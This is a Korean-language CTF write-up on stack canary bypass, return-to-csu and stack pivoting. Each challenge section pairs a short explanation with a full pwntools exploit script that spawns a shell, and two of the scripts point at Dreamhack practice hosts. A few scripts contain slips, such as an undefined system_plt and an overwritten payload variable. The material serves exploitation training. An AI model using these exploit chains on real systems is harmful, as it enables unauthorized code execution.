# Canary & Stack pivoting & RTC


## ssp_000

read 함수가 실행되기 전에 rsi 레지스터를 보면 canary를 찾을 수 있으며, 80bytes를 bof하면 canary를 덮을 수 있다.
bof를 이용해 canary를 변조하여 __stack_chk_fail 함수를 실행하도록 한다. __stack_chk_fail 이전에 입력받은 주소의 값을 변조하는 코드가 있으므로 이 부분에서 __stack_chk_fail 함수의 got를 get_shell의 주소로 덮어쓰면 쉘을 얻을 수 있다.

```python

from pwn import *

#p = process("./ssp_000")
p = remote("host1.dreamhack.games",10370)
e = ELF("./ssp_000")

get_shell = 0x4008ea

p.sendline(b"A"*80)
p.recvuntil("r : ")
p.sendline(str(e.got['__stack_chk_fail']))
p.recvuntil("e : ")
p.sendline(str(get_shell))

p.interactive()

```


## ssp_001

스택의 구조를 살펴보면 box[64], name[64], canary[4] 순이다. 그러므로 box와 canary의 offset은 128임을 알 수 있다. 따라서 box에 129, 130, 131, 132를 입력하여 canary를 얻을 수 있다. 또한 name에서 bof를 일으켜 얻은 canary로 덮고 sfp와 dummy, ret을 덮으면 쉘을 얻을 수 있다.


```python
from pwn import *

#p = process("./ssp_001")
p = remote("host1.dreamhack.games",15771)
e = ELF("./ssp_001")

get_shell = e.symbols["get_shell"]

p.recvuntil("> ")

canary = "0x"
for i in range(4):
	p.sendline(b"P")
	p.recvuntil(": ")
	p.sendline(str(0x80+i))
	p.recvuntil("is : ")
	canary = p.recvuntil('\n')[:2] + canary
  
canary = int(canary, 16)

payload = b"A"*64 
payload += p32(canary)
payload += b"B"*8
payload += p32(get_shell) 


p.sendline("E")
p.recvuntil("Size : ")
p.sendline(str(len(payload)))
p.recvuntil("Name : ")

p.sendline(payload)

p.interactive()
```


 

## 1 csu_example

프로그램이 실행되기 전에 실행되는 __libc_csu_init() 함수로 return하여 원하는 명령을 실행할 수 있다. 먼저 csu2로 return하여 write의 실제 주소를 출력하기 위한 인자를 입력한 뒤 csu1으로 return한다. 이후 한 번 더 실행되므로 bss영역에 read함수를 쓸 수 있다. 그 다음 rsp에 bss영역의 주소를 넣고 leave와 ret를 하여 stack pivoting을 진행하고, 더미를 입력한 뒤 RTL 하면 쉘을 얻을 수 있다. 


```python
from pwn import *

p = process("./csu_example")
e = ELF("./csu_example")
libc = e.libc

csu1 = 0x4006c0
csu2 = 0x4006d6
write_got = e.got['write']
read_got = e.got['read']
leave_ret = 0x00400672
pop_rdi = 0x004006e3
bss = e.bss() + 0x400

# write(1, write_got, 8)
payload = b'A'*0x100
payload += p64(csu2)
payload += b'B'*0x8
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(write_got) #r12
payload += p64(1) #r13->edi
payload += p64(write_got) #r14->rsi
payload += p64(8) #r15->rdx
payload += p64(csu1)

# read(0, bss, 0x150)
payload += b'C'*0x8
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(read_got) #r12
payload += p64(0) #r13->edi
payload += p64(bss) #r14->rsi
payload += p64(0x150) #r15->rdx
payload += p64(csu1)

# rbp->bss : stack pivoting
payload = b'D'*16
payload += p64(bss)
payload += b'D'*32
payload += p64(leave_ret)

p.send(payload)

write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
p.recvline()
write_addr = u64(p.recv(8).ljust(8, '\x00'))
libc_base = write_addr - write_offset

system_addr = libc_base + system_offset
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]


# system('/bin/sh')
payload = b'E'*8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(0x004004c6) #ret sled
payload += p64(system_addr)

p.send(payload)


p.interactive()


```



## 2 Pivot2

2bytes밖에 bof가 일어나지 않지만 Stack Pivoting을 이용하여 SFP를 덮을 수 있다. 그 이유는 SFP의 주소가 buf주소와 1.5byte 정도 차이가 나기 때문이다. SFP의 끝 2bytes를 buf의 끝 2bytes로 덮어주면 fake stack을 형성하여 payload를 실행할 수 있다. fake stack에서 printf를 이용하여 printf 함수의 주소를 알아내고 libc_leak을 진행한 뒤 같은 방법으로 stack pivoting을 진행하여 system rtl을 시도했다.


```python
from pwn import *

p = process('./pivot2')
e = ELF('./pivot2')
libc = e.libc


buf_addr = int(p.recv(14), 16)
buf_addr_2byte = buf_addr % 0x10000

printf_got = 0x600fd8
printf_plt = 0x004004ce
pop_rdi = 0x004006f3
main = 0x0000000000400639


payload = b'A'*0x8
# printf(printf_got)
payload += p64(pop_rdi)
payload += p64(printf_got)
payload += p64(0x004004ce) #ret
payload += p64(printf_plt)
payload += p64(main)
payload += b'B'*(0x100-len(payload))
payload += p64(buf_addr_2byte)

p.send(payload)

printf_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]


payload = b'A'*0x8
# system('/bin/sh')
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(0x004004ce) #ret
payload += p64(system_plt)
payload += b'B'*(0x100-len(payload))
payload += p64(buf_addr_2byte)

p.send(payload)

p.interactive()

```


## 3 rop_master

16만큼의 bof가 나기 때문에 ret 주소까지밖에 덮을 수 없으므로 다른 방식으로 rop를 진행해야 한다. stack에는 NX bit로 인해 실행 권한이 없으므로 name이 저장된 data 영역에 fake stack을 구성한다. fake stack에서 write함수를 통해 write함수를 구해 와야 하는데, pop_rdx gadget이 바이너리에 없으므로 return to csu 기법을 이용해야 한다. rtc를 이용하여 gadget을 설정하여 write(1, write_got, 8)을 실행할 수 있다. 또한 이후에 read(0, bss, 32)를 이용하여 입력을 받도록 하고 system('/bin/sh')를 호출하는 payload를 입력한다. bss에 payload를 입력하는  bss 영역에 stack pivoting을 진행한다. 



```python
from pwn import *

#context.log_level = 'debug'

p = process('./rop_master')
e = ELF('./rop_master')
libc = e.libc

csu1 = 0x4005f0
csu2 = 0x400606
read_plt = 0x400440 
read_got = 0x601020
write_plt = 0x400430
write_got =  0x601018
main = 0x400537
name = 0x601060
pop_rdi = 0x00400613
pop_rsp_pop3_ret = 0x0040060d
leave_ret = 0x004005a2
bss = e.bss()



#1 write(1, write_got, 8) by rtc
payload = b'A'*0x8
payload += p64(csu2)
payload += b'B'*0x8
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(write_got) #r12
payload += p64(1) #r13->edi
payload += p64(write_got) #r14->rsi
payload += p64(8) #r15->rdx
payload += p64(csu1)

#2 read(0, bss, 40) by rtc
payload += b'C'*0x8
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(read_got) #r12
payload += p64(0) #r13->edi
payload += p64(bss+24) #r14->rsi
payload += p64(32) #r15->rdx
payload += p64(csu1)

#3 stack pivoting by rtc
payload += b"D"*16
payload += p64(bss)
payload += b"E"*32           
payload += p64(pop_rsp_pop3_ret)
payload += p64(bss)


p.recvuntil(b"Your name : ")
#pause()
p.send(payload)	


#4 name stack pivoting
payload = b'A'*0x100
payload += p64(name)
payload += p64(leave_ret)


p.recvuntil(b"Can you rop it?\n")
#pause()
p.send(payload)


write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
write_addr = u64(p.recv(8).ljust(8, b'\x00'))
libc_base = write_addr - write_offset
system_addr = libc_base + system_offset
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]


#6 system('/bin/sh')
payload = p64(pop_rdi)
payload += p64(binsh)
payload += p64(0x00400416) #ret
payload += p64(system_addr)

#pause()
p.send(payload)



p.interactive()


```






